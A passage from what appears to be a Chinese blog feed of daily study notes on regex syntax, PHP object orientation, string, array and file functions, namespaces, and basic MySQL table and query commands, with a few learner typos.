向预查，在任何匹配 pattern 的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如，’Windows (?=95|98|NT|2000)’ 能匹配 “Windows 2000″ 中的 “Windows” ，但不能匹配 “Windows 3.1″ 中的 “Windows”。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。(?!pattern)    负 向预查，在任何不匹配 pattern 的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如’Windows (?!95|98|NT|2000)’ 能匹配 “Windows 3.1″ 中的 “Windows”，但不能匹配 “Windows 2000″ 中的 “Windows”。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始x|y    匹配 x 或 y。例如，’z|food’ 能匹配 “z” 或 “food”。’(z|f)ood’ 则匹配 “zood” 或 “food”。[xyz]    字符集合。匹配所包含的任意一个字符。例如， ‘[abc]’ 可以匹配 “plain” 中的 ‘a’。[^xyz]    负值字符集合。匹配未包含的任意字符。例如， ‘[^abc]’ 可以匹配 “plain” 中的’p&#39;。[a-z]    字符范围。匹配指定范围内的任意字符。例如，’[a-z]’ 可以匹配 ‘a’ 到 ‘z’ 范围内的任意小写字母字符。[^a-z]    负值字符范围。匹配任何不在指定范围内的任意字符。例如，’[^a-z]’ 可以匹配任何不在 ‘a’ 到 ‘z’ 范围内的任意字符。\b    匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\b’ 可以匹配”never” 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。\B    匹配非单词边界。’er\B’ 能匹配 “verb” 中的 ‘er’，但不能匹配 “never” 中的 ‘er’。\cx    匹配由 x 指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。\d    匹配一个数字字符。等价于 [0-9]。\D    匹配一个非数字字符。等价于 [^0-9]。\f    匹配一个换页符。等价于 \x0c 和 \cL。\n    匹配一个换行符。等价于 \x0a 和 \cJ。\r    匹配一个回车符。等价于 \x0d 和 \cM。\s    匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。\S    匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。\t    匹配一个制表符。等价于 \x09 和 \cI。\v    匹配一个垂直制表符。等价于 \x0b 和 \cK。\w    匹配包括下划线的任何单词字符。等价于’[A-Za-z0-9_]’。\W    匹配任何非单词字符包括下划线。等价于 ‘[^A-Za-z0-9_]’。\xn    匹配 n，其中 n 为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如，’\x41′ 匹配 “A”。’\x041′ 则等价于 ‘\x04′ &amp; “1″。正则表达式中可以使用 ASCII 编码。.\num    匹配 num，其中 num 是一个正整数。对所获取的匹配的引用。例如，’(.)\1′ 匹配两个连续的相同字符。\n    标识一个八进制转义值或一个向后引用。如果 \n 之前至少 n 个获取的子表达式，则 n 为向后引用。否则，如果 n 为八进制数字 (0-7)，则 n 为一个八进制转义值。\nm    标 识一个八进制转义值或一个向后引用。如果 \nm 之前至少有 nm 个获得子表达式，则 nm 为向后引用。如果 \nm 之前至少有 n 个获取，则 n 为一个后跟文字 m 的向后引用。如果前面的条件都不满足，若 n 和 m 均为八进制数字 (0-7)，则 \nm 将匹配八进制转义值 nm。\nml    如果 n 为八进制数字 (0-3)，且 m 和 l 均为八进制数字 (0-7)，则匹配八进制转义值 nml。\un    匹配 n，其中 n 是一个用四个十六进制数字表示的 Unicode 字符。例如， \u00A9 匹配版权符号 (?)。例子 匹配32位md5/^[a-z0-9]&#123;32&#125;$/</code></pre>]]></content>
      
      
      <categories>
          
          <category> 附录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 附录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP的面向对象</title>
      <link href="/2022/11/14/20221114/"/>
      <url>/2022/11/14/20221114/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="类与对象"><a href="#类与对象" class="headerlink" title="类与对象"></a>类与对象</h4><p>类 − 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。<br>对象 − 是类的实例。<br>对象的主要三个特性：<br>1.对象的行为：可以对对象施加那些操作，开灯，关灯就是行为。<br>2.对象的形态：当施加那些方法是对象如何响应，颜色，尺寸，外型。<br>3.对象的表示：对象的表示就相当于身份证，具体区分在相同的行为与状态下有什么不同。</p><h4 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h4><h5 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h5><p>成员变量 − 定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可称为对象的属性。</p><p>成员函数 − 定义在类的内部，可用于访问对象的数据。</p><p>继承 − 继承性是子类自动共享父类数据结构和方法的机制，这是类之间的一种关系。在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把这个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容。</p><p>父类 − 一个类被其他类继承，可将该类称为父类，或基类，或超类。</p><p>子类 − 一个类继承其他类称为子类，也可称为派生类。</p><p>多态 − 多态性是指相同的操作或函数、过程可作用于多种类型的对象上并获得不同的结果。不同的对象，收到同一消息可以产生不同的结果，这种现象称为多态性。</p><p>重载 − 简单说，就是函数或者方法有同样的名称，但是参数列表不相同的情形，这样的同名不同参数的函数或者方法之间，互相称之为重载函数或者方法。</p><p>抽象性 − 抽象性是指将具有一致的数据结构（属性）和行为（操作）的对象抽象成类。一个类就是这样一种抽象，它反映了与应用有关的重要性质，而忽略其他一些无关内容。任何类的划分都是主观的，但必须与具体的应用有关。</p><p>封装 − 封装是指将现实世界中存在的某个客体的属性与行为绑定在一起，并放置在一个逻辑单元内。</p><p>构造函数 − 主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。</p><p>析构函数 − 析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。析构函数往往用来做”清理善后” 的工作（例如在建立对象时用new开辟了一片内存空间，应在退出前在析构函数中用delete释放）。</p><h5 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h5><pre><code>【定义函数】&lt;?php                                      //1.定义类class 类名 &#123;  /* 成员变量 */  var $var1;  var $var2 = &quot;constant string&quot;;  /* 成员函数 */  function 成员函数的函数名 ($arg1, $arg2)   &#123;      return $this-&gt;函数 = 变量             //赋值并调用函数  &#125;&#125;?&gt;$对象名 = new 类名;                         //2.创建对象echo $对象名-&gt;成员函数(&quot;传入的参数&quot;);        //3.调用成员方法大括号&#123;&#125;内可以定义变量和方法变量使用 var 来声明, 变量也可以初始化值函数定义类似 PHP 函数的定义，但函数只能通过该类及其实例化的对象访问。变量 $this 代表自身的对象【构造函数】在创建对象时， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。&lt;?phpclass 类名 &#123;   function __construct() &#123;       print &quot;构造函数&quot;;       $this-&gt;name = &quot;&quot;;   &#125;   function __destruct() &#123;       print &quot;销毁&quot; . $this-&gt;name . &quot;\n&quot;;   &#125;&#125;$obj = new 类名();?&gt;【继承】子类继承父类的特征和行为，使得子类对象具有父类的属性和方法，或子类从父类继承方法，使得子类具有父类相同的行为(父类=基类)&lt;?php // 子类扩展站点类别class 类名 &#123;           //extends继承一个类   var $category;    function setCate($par)&#123;        $this-&gt;category = $par;    &#125;    function getCate()&#123;        echo $this-&gt;category . PHP_EOL;    &#125;&#125;注意:PHP 不支持多继承【方法重写】顾名思义重新定义function【访问控制】PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有）protected(受保护的)只能被自身子父类访问private(私有的)只能被定义的类访问publice(公有的)可以在任何地方访问类属性必须被定义，var视为publice【接口】概念:指定某个类必须实现哪些方法，但不需要定义这些方法的具体内容。特性:通过interface定义，但是其中定义的所有方法都必须是公有而且要是空的。类可以实现多个接口，用逗号来分隔多个接口的名称。【常量】在类中始终保持不变的值定义为常量。在定义和使用常量的时候不需要使用 $ 符号。常量的值必须是一个定值【接口与抽象类】1. 接口（1）对接口的使用是通过关键字implements（2）接口不能定义成员变量（包括类静态变量），能定义常量（3）子类必须实现接口定义的所有方法（4）接口只能定义不能实现该方法（5）接口没有构造函数（6）接口中的方法和实现它的类默认都是public类型的2. 抽象类（1）对抽象类的使用是通过关键字extends（2）不能被实例化，可以定义子类必须实现的方法（3）子类必须定义父类中的所有抽象方法，这些方法的访问控制必须和父类中一样（或者更为宽松）（4）如一个类中有一个抽象方法，则该类必须定义为抽象类（5）抽象类可以有构造函数（6）抽象类中的方法可以使用private,protected,public来修饰。（7）一个类可以同时实现多个接口，但一个类只能继承于一个抽象类。【关键字】1.Static(1)声明类属性或方法为 static(静态)，就可以不实例化类而直接访问(2)静态属性不能通过一个类已实例化的对象来访问（但静态方法可以）。(3)由于静态方法不需要通过对象即可调用，所以伪变量 $this 在静态方法中不可用。(4)静态属性不可以由对象通过 -&gt; 操作符来访问。2.Final(1)如果父类中的方法被声明为 final，则子类无法覆盖该方法。(2)如果一个类被声明为 final，则不能被继承。【调用父类构造方法】PHP 不会在子类的构造方法中自动的调用父类的构造方法。要执行父类的构造方法，需要在子类的构造方法中调用 parent::__construct() </code></pre><h4 id="面向对象暂时先写到这里，后面有新的认识再回来更改。"><a href="#面向对象暂时先写到这里，后面有新的认识再回来更改。" class="headerlink" title="面向对象暂时先写到这里，后面有新的认识再回来更改。"></a>面向对象暂时先写到这里，后面有新的认识再回来更改。</h4><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="当废话满天飞的时候，沉默是人类最大的贡献。"><a href="#当废话满天飞的时候，沉默是人类最大的贡献。" class="headerlink" title="当废话满天飞的时候，沉默是人类最大的贡献。"></a>当废话满天飞的时候，沉默是人类最大的贡献。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP的常见字符操作函数</title>
      <link href="/2022/11/13/20221113/"/>
      <url>/2022/11/13/20221113/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="仔细收集php的常见字符操作函数"><a href="#仔细收集php的常见字符操作函数" class="headerlink" title="仔细收集php的常见字符操作函数"></a>仔细收集php的常见字符操作函数</h4><pre><code>addcslashes — 以 C 语言风格使用反斜线转义字符串中的字符addslashes — 使用反斜线引用字符串bin2hex — 函数把包含数据的二进制字符串转换为十六进制值chop — rtrim 的别名 — 删除字符串末端的空白字符（或者其他字符）chr — 返回指定的字符 — chr ( int $ascii )chunk_split — 将字符串分割成小块convert_cyr_string — 将字符由一种 Cyrillic 字符转换成另一种convert_uudecode — 解码一个 uuencode 编码的字符串convert_uuencode — 使用 uuencode 编码一个字符串count_chars — 返回字符串所用字符的信息crc32 — 计算一个字符串的 crc32 多项式crypt — 单向字符串散列echo — 输出一个或多个字符串explode — 使用一个字符串分割另一个字符串fprintf — 将格式化后的字符串写入到流get_html_translation_table — 返回使用 htmlspecialchars 和 htmlentities 后的转换表hebrev — 将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew）hebrevc — 将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew），并且转换换行符hex2bin — 转换十六进制字符串为二进制字符串html_entity_decode — Convert HTML entities to their corresponding charactershtmlentities — 将字符转换为 HTML 转义字符htmlspecialchars_decode — 将特殊的 HTML 实体转换回普通字符htmlspecialchars — 将特殊字符转换为 HTML 实体implode — 将一个一维数组的值转化为字符串join — 别名 implodelcfirst — 使一个字符串的第一个字符小写levenshtein — 计算两个字符串之间的编辑距离localeconv — Get numeric formatting informationltrim — 删除字符串开头的空白字符（或其他字符）md5_file — 计算指定文件的 MD5 散列值md5 — 计算字符串的 MD5 散列值metaphone — Calculate the metaphone key of a stringmoney_format — 将数字格式化成货币字符串nl_langinfo — Query language and locale informationnl2br — 在字符串所有新行之前插入 HTML 换行标记number_format — 以千位分隔符方式格式化一个数字ord — 转换字符串第一个字节为 0-255 之间的值parse_str — 将字符串解析成多个变量print — 输出字符串printf — 输出格式化字符串quoted_printable_decode — 将 quoted-printable 字符串转换为 8-bit 字符串quoted_printable_encode — 将 8-bit 字符串转换成 quoted-printable 字符串quotemeta — 转义元字符集rtrim — 删除字符串末端的空白字符（或者其他字符）setlocale — 设置地区信息sha1_file — 计算文件的 sha1 散列值sha1 — 计算字符串的 sha1 散列值similar_text — 计算两个字符串的相似度soundex — Calculate the soundex key of a stringsprintf — Return a formatted stringsscanf — 根据指定格式解析输入的字符str_contains — Determine if a string contains a given substringstr_ends_with — Checks if a string ends with a given substringstr_getcsv — 解析 CSV 字符串为一个数组str_ireplace — str_replace 的忽略大小写版本str_pad — 使用另一个字符串填充字符串为指定长度str_repeat — 重复一个字符串str_replace — 子字符串替换str_rot13 — 对字符串执行 ROT13 转换str_shuffle — 随机打乱一个字符串str_split — 将字符串转换为数组str_starts_with — Checks if a string starts with a given substringstr_word_count — 返回字符串中单词的使用情况strcasecmp — 二进制安全比较字符串（不区分大小写）strchr — 别名 strstrstrcmp — 二进制安全字符串比较strcoll — 基于区域设置的字符串比较strcspn — 获取不匹配遮罩的起始子字符串的长度strip_tags — 从字符串中去除 HTML 和 PHP 标记stripcslashes — 反引用一个使用 addcslashes 转义的字符串stripos — 查找字符串首次出现的位置（不区分大小写）stripslashes — 反引用一个引用字符串stristr — strstr 函数的忽略大小写版本strlen — 获取字符串长度strnatcasecmp — 使用“自然顺序”算法比较字符串（不区分大小写）strnatcmp — 使用自然排序算法比较字符串strncasecmp — 二进制安全比较字符串开头的若干个字符（不区分大小写）strncmp — 二进制安全比较字符串开头的若干个字符strpbrk — 在字符串中查找一组字符的任何一个字符strpos — 查找字符串首次出现的位置strrchr — 查找指定字符在字符串中的最后一次出现strrev — 反转字符串strripos — 计算指定字符串在目标字符串中最后一次出现的位置（不区分大小写）strrpos — 计算指定字符串在目标字符串中最后一次出现的位置strspn — 计算字符串中全部字符都存在于指定字符集合中的第一段子串的长度。strstr — 查找字符串的首次出现strtok — 标记分割字符串strtolower — 将字符串转化为小写strtoupper — 将字符串转化为大写strtr — 转换指定字符substr_compare — 二进制安全比较字符串（从偏移位置比较指定长度）substr_count — 计算字串出现的次数substr_replace — 替换字符串的子串substr — 返回字符串的子串trim — 去除字符串首尾处的空白字符（或者其他字符）ucfirst — 将字符串的首字母转换为大写ucwords — 将字符串中每个单词的首字母转换为大写vfprintf — 将格式化字符串写入流vprintf — 输出格式化字符串vsprintf — 返回格式化字符串wordwrap — 打断字符串为指定数量的字串is_array 判断是否为数组count 数组的元素数目array_search — 在数组中搜索给定的值，如果成功则返回相应的键名array_key_exists()在给定的 key 存在于数组中时返回 TRUEarray_unshift()  将传入的单元插入到 array 数组的开头。注意单元是作为整体被插入的，因此传入单元将保持同样的顺序。所有的数值键名将修改为从零开始重新计数，所有的文字键名保持不变array_shift()  将array 的第一个单元移出并作为结果返回，将 array 的长度减一并将所有其它单元向前移动一位。所有的数字键名将改为从零开始计数，文字键名将不变。array_unique()  接受 array 作为输入并返回没有重复值的新数组。注意键名保留不变。 array_unique()  先将值作为字符串排序，然后对每个值只保留第一个遇到的键名，接着忽略所有后面的键名。这并不意味着在未排序的 array 中同一个值的第一个出现的键名会被保留。 in_array — 检查数组中是否存在某个值  如果找到指定的值则返回 TRUE，否则返回 FALSE 。in_array()是区分大小写的。PHP_EOL 为换行符</code></pre><p>部分实例</p><pre><code>$a=&#39;123456&#39;;echo $str.&quot; 一共有 &quot;.strlen($a).&quot;字符&quot;;//去掉空格echo trim($str);echo $str1;//查找字符串 返回位置echo strpos($str,&#39;暗月&#39;);//截取字符串echo substr($str,strpos($str,&#39;暗月&#39;),strpos($str,&#39;培训&#39;));//md5  加密echo md5($a);//通过下标 取字符的值echo $a[0];//字符串替换函数$a1=str_replace(&#39;1&#39;,&#39;0&#39;,$a);echo $a1;</code></pre><h4 id="具体的使用方法请查看手册"><a href="#具体的使用方法请查看手册" class="headerlink" title="具体的使用方法请查看手册"></a>具体的使用方法请查看手册</h4><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="最后，分享一句圆桌派的话：“你可以是孤岛，也可-以连成一片。”"><a href="#最后，分享一句圆桌派的话：“你可以是孤岛，也可-以连成一片。”" class="headerlink" title="最后，分享一句圆桌派的话：“你可以是孤岛，也可 以连成一片。”"></a>最后，分享一句圆桌派的话：“你可以是孤岛，也可 以连成一片。”</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP基础（3）</title>
      <link href="/2022/11/12/20221112/"/>
      <url>/2022/11/12/20221112/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="PHP超级全局变量"><a href="#PHP超级全局变量" class="headerlink" title="PHP超级全局变量"></a>PHP超级全局变量</h4><p>PHP超级全局变量列表：<br>$GLOBALS　　一个包含了全部变量的全局组合数组。变量的名字就是数组的键。<br>$_SERVER　　一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组<br>$_REQUEST　　用于收集HTML表单提交的数据。<br>它可以获取 cookie  get  post<br>$_POST　　应用于收集表单数据，在HTML form标签的指定该属性：”method=”post”。<br>$_GET　　应用于收集表单数据，在HTML form标签的指定该属性：”method=”get”。<br>Array []<br>$_FILES　　<br>$_ENV　　<br>$_COOKIE　　<br>$_SESSION</p><h4 id="PHP-Include-文件"><a href="#PHP-Include-文件" class="headerlink" title="PHP Include 文件"></a>PHP Include 文件</h4><p>服务器端包含用于创建可在多个页面重复使用的函数、页眉、页脚或元素。</p><pre><code>将 PHP 文件的内容插入另一个 PHP 文件:include &#39;filename&#39;;require &#39;filename&#39;;错误处理方面:require 会生成致命错误（E_COMPILE_ERROR）并停止脚本include 只生成警告（E_WARNING），但脚本会继续</code></pre><h4 id="PHP-文件处理"><a href="#PHP-文件处理" class="headerlink" title="PHP 文件处理"></a>PHP 文件处理</h4><p>操作文件:<br>readfile() 函数读取文件，并把它写入输出缓冲。<br>文件打开/读取/关闭:<br>fopen(“AAA.txt”,”/r”)函数的第一个参数包含被打开的文件名，第二个参数规定打开文件的模式。</p><p>打开模式详解:<br>r:打开只读文件，指针在文件开头<br>w:只写文件，如果不存在就删除或创建，指针在文件开头<br>a:只写文件，保留数据，指针在结尾，如果文件不存在就创建新文件<br>x:创建新文件为只写，如果文件存在就返回false和错误<br>r+:打开文件为读/写，指针在开头<br>w+:打开文件为读/写，如果不存在就创建或删除，指针在开头<br>a+:打开文件为读/写，保留数据，指针在结尾，如果不存在就创建新文件<br>x+:创建文件为读/写，如果文件已存在就返回false和错误</p><p>fread($文件名,filesize(“AAA.txt”));<br>第一个参数包含待读取文件的文件名，第二个参数规定待读取的最大字节数</p><p>fclose($文件名);<br>关闭打开的文件，节约服务器资源</p><p>fgets($文件名);<br>从文件读取单行，调用后，文件指针会移动到下一行。</p><p>feof($myfile);<br>检查是否已到达文件末尾(EOF)，常用于遍历未知长度的数据</p><p>fgetc($myfile);<br>从文件中读取单个字符，调用后，文件指针会移动到下一个字符。</p><p>fopen(“文件名”, “w”)；<br>如果用来打开不存在的文件，此函数会创建文件，假定文件被打开为写入（w）或增加（a）。</p><p>fwrite($文件名,要发送的字符串);<br>写入文件,会发生覆盖原数据</p><h4 id="文件的-复制-删除-重名"><a href="#文件的-复制-删除-重名" class="headerlink" title="文件的 复制 删除 重名"></a>文件的 复制 删除 重名</h4><p>php文件重命名：函数rename()。<br>php文件复制：函数copy();<br>php文件删除：函数unlink();</p><h4 id="获取文件属性"><a href="#获取文件属性" class="headerlink" title="获取文件属性"></a>获取文件属性</h4><pre><code>file_exists(string $filename)是否存在,返回false或trueis_file() 是否为文件,返回false或truefilesize() 文件大小,返回false或trueis_readable() 文件名是否可读,返回false或trueis_writable() 文件名是否可改,返回false或trueis_executable() 文件名是否可执行,返回false或truefilectime() 文件创建时间，返回UNX时间戳filemtime() 文件修改时间，返回UNX时间戳fileatime() 上次访问时间，返回UNX时间戳stat() 获取大部分属性值，返回包含文件信息的数组</code></pre><h4 id="PHP目录操作"><a href="#PHP目录操作" class="headerlink" title="PHP目录操作"></a>PHP目录操作</h4><p>新建目录：mkdir(路径，权限，递归创建)<br>删除目录：rmdir()<br>移动（改名）：rename()<br>获取目录内容：<br>//打开目录<br>目录句柄 = opendir()<br>//读取目录<br>文件名 = readdir(目录句柄)<br>依次读取文件名，同时向下移动文件句柄指针，读取不到则返回false<br>//关闭目录<br>closedir()</p><p>注:前目录. 上级目录用..</p><h4 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h4><p>定义：人为的将内存进行分隔<br>作用：让不同内存区域的同名结构共存<br>目的：解决重名结构问题<br>空间元素：函数，常量，类，不包括变量！！!<br>语法:<br>namespace 空间名<br>namespace 空间名\子空间</p><p>命名空间访问(url)<br>1.定名称访问：直接访问空间元素的名字（只访问自己命名空间的元素）<br>2.名称访问：使用自己当前的子空间名字+ \ + 元素名字<br>3.访问：\ + 全局空间 + \  +  元素名字<br>注：任何空间元素访问，只针对函数，类，常量，不包括变量！！!</p><p>全局空间(C盘)<br>如果定义了命名空间，非限定名称的寻找系统常量的方式：<br>首先,自己的空间内找<br>然后,果找不到元素<br>系统常量–&gt;进入全局空间寻找<br>系统类–&gt;不会自动进入全局空间寻找，而是会报错</p><pre><code>命名空间的引入1.空间引入方式：use关键字    (1)类：use 空间名\类名    (2)数：use function 空间名\函数名    (3)量：use const 空间名\常量名2.当引入元素时重名，通过 as 来起别名    use 空间名\类名 as 别名3.引入多个元素    use 空间名\&#123;        类名，        function 函数名，        const 常量    &#125;       4. 引入空间    use 空间名</code></pre><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="此爱隔山海，山海不可平。"><a href="#此爱隔山海，山海不可平。" class="headerlink" title="此爱隔山海，山海不可平。"></a>此爱隔山海，山海不可平。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP基础（2）</title>
      <link href="/2022/11/11/20221111/"/>
      <url>/2022/11/11/20221111/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><pre><code>文件1function add()&#123;    echo &#39;执行&#39;;&#125;add增加，del删除，update更改，select查询文件2include (&#39;文件1.php&#39;);          //调用文件add();                         //调用函数include与require区别include在没有这个文件时报错并执行，但是require报错但是不执行include_once与require_once区别可以重复调用文件，区别同上</code></pre><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><pre><code>索引数组:$arr=[1,2,3,4,5];var_dump($arr);或$arr=array(1,2,3,4,5);var_dump($arr);关联数组:$arr=[    &#39;A&#39;=&gt;&#39;a&#39;,    &#39;B&#39;=&gt;&#39;b&#39;;];var_dump($arr);二维(多维)数组:$arr=[    &#39;A&#39;=&gt;[        &#39;a&#39;,        &#39;b&#39;,        &#39;c&#39;,    ]];var_dump($arr);</code></pre><h5 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h5><p>增加:直接声明$arr[位置]=’内容’;<br>删除:unset($arr[位置]);<br>修改:重新定义<br>对于多维数组要var_dump($arr[第一层位置][第二层位置]…….);<br>获取循环次数:echo count($arr);</p><pre><code>遍历foreach ($arr as $key =&gt; $value) &#123;    echo $key.&#39;&lt;br/&gt;&#39;;&#125;list($a , $b , $c , $d , $e) = $arr;echo $a,$b,$c,$d;一一赋值，多出来的跳过，只对有索引的有效while (list($key , $val) = each($arr)) &#123;    echo $key.&#39;--&#39;.$val.&#39;&lt;br/&gt;&#39;;&#125;排序sort() - 对数组进行升序排列rsort() - 对数组进行降序排列asort() - 根据关联数组的值，对数组进行升序排列ksort() - 根据关联数组的键，对数组进行升序排列arsort() - 根据关联数组的值，对数组进行降序排列krsort() - 根据关联数组的键，对数组进行降序排列数组的合拼$array1 =array(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);$array2 = array(&#39;a1&#39;=&gt;&#39;php&#39;,&#39;a2&#39;=&gt;&#39;python&#39;,&#39;a3&#39;=&gt;&#39;java&#39;);$array3 = array_merge($array1,$array2);添加到指定位置array_splice(数组，位置，删除几个，增加元素）</code></pre><h4 id="超全局数组"><a href="#超全局数组" class="headerlink" title="超全局数组"></a>超全局数组</h4><p>配合html前端页面method=’get/post’<br>var_dump($_GET);获取GET的参(显示内容在URL)<br>var_dump($_POST);获取POST的参(不显示)<br>var_dump($_REQUEST);都可以获取<br>前端name所设置的会把参数传到后端<br>name=’username’<br>$username=$_GET[‘username’];</p><h4 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h4><pre><code>notice注意                   //后续代码会继续执行warning警告                  //后续代码会继续执行fatal error致命错误          //后续代码不会继续执行@可以消除警报(除了fatal error)在ini配置文件里display_errors:On可以取消报错(所有)在ini配置文件里error_log找错误日志</code></pre><h4 id="日期函数"><a href="#日期函数" class="headerlink" title="日期函数"></a>日期函数</h4><p>时间戳:时间戳是从1970年1月1日（UTC/GMT的午夜）开始所经过的秒数，不考虑闰秒。<br>配置文件可改时区，不详细讲</p><h4 id="数据库简介-dos操作"><a href="#数据库简介-dos操作" class="headerlink" title="数据库简介(dos操作)"></a>数据库简介(dos操作)</h4><pre><code>对数据库的解释:数据库相当于文件夹，表相当于文件，字段就是内容。注释符:#    &quot;--  &quot;    /* */&lt;不是内部命令就更改环境变量&gt;【库操作】连接数据库:mysql -uroot -p查库:show databases;建库creat database 库名;删库drop database 库名;退出mysql &gt; exit;mysql &gt; quit;mysql &gt; \q;重命名数据库RENAME database olddbname TO newdbname【表操作】进库:use 库名;建表:creat table 表名(id int,字段名 数据类型(长度) , 字段名 数据类型(位数));建表命令:show creat table 表名;改表名:alter table 原表名 rename 新名字查表:show tables;select * from table_name删表:drop table 表名;查表结构:desc 表名;                      //字段类型，主键，是否为空等属性，但不显示外键【字段操作】建表字段:alter table 表名 add 字段名 (字段类型)改表字段:alter table 表名 change 原来的字段名 现在的字段名 数据类型(位数);改表字段值:alter table 表名 modify 字段名 修改后的值删表字段:alter table 表名 drop 字段名更改表的存储引擎:alter table 表名 engine=存储引擎名;给所有字段增加数据:insert into users (字段名1,字段名2,字段名3)values(值1,值2,值3);【插入顺序】first    alter table 表名 add 字段(字段类型) firstafter    alter table 表名 add 字段名(字段类型) after (在谁后面)【其它命令】显示系统特定资源的信息show status;                   //例如，正在运行的线程数量。</code></pre><h4 id="mysql数据类型"><a href="#mysql数据类型" class="headerlink" title="mysql数据类型"></a>mysql数据类型</h4><p>整形:<br>int4字节，bigint8字节<br>浮点型:<br>float(m,d)<br>double(m,d)<br>decimal(m,d)<br>字符型:<br>char定长字符串(常用于32位md5密码)<br>varchar变长字符串(常用于用户名)<br>时间型:<br>4字节，年月日格式<br>auto_increment:<br>自动增加，只用于整形，priimary&emsp;key设置起始值(默认为1)<br><a href="https://www.cnblogs.com/-xlp/p/8617760.html">总结内容</a></p><h5 id="以上内容皆可使用phpMyAdmin和NavicatPremium更改"><a href="#以上内容皆可使用phpMyAdmin和NavicatPremium更改" class="headerlink" title="以上内容皆可使用phpMyAdmin和NavicatPremium更改"></a>以上内容皆可使用phpMyAdmin和NavicatPremium更改</h5><h4 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h4><pre><code>普通索引:alter table 表名 add index(字段);唯一索引:alter table 表名 add unique(字段);主键索引:alter table 表名 add primary key(字段);全文索引:alter table 表名 add fulltext(字段);显示索引:show index from 字段名</code></pre><p><a href="https://blog.csdn.net/qq_35190492/article/details/109257302?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166808686716782428672275%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166808686716782428672275&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-109257302-null-null.142%5Ev63%5Ejs_top,201%5Ev3%5Econtrol,213%5Ev2%5Et3_esquery_v2&utm_term=mysql%E7%B4%A2%E5%BC%95&spm=1018.2226.3001.4187">使用及区别</a></p><h4 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h4><pre><code>select选择时如果要限制条件就在后面加上where和条件where age&lt;&gt;50; == where age!50                     //取非age in(18,16,17);                                  //固定查询的值address like &#39;Ax&#39;;                                 //模糊查询A开头的address like &#39;xAx&#39;;                                //模糊查询含A的select * from 表名 order by 列名 desc;             //降序显示，默认为升序(asc)select * from 表名 limit 5,5;                      //从第五个值开始往下取5个值select * from 表名 group by 列名;                  //分组(只保留一个，去重)select count(*) from 表名;                         //显示该列有几个数据select 列名 as 别名 from 表名;                     //给该列起别名注意:and优先级高于or，因此先计算and表达式再运算or表达式聚合查询:count()返回行数sum()返回某列值的和avg()返回某列平均值max()返回某列最大值min()返回某列最小值分组查询:select * from 表名 group by 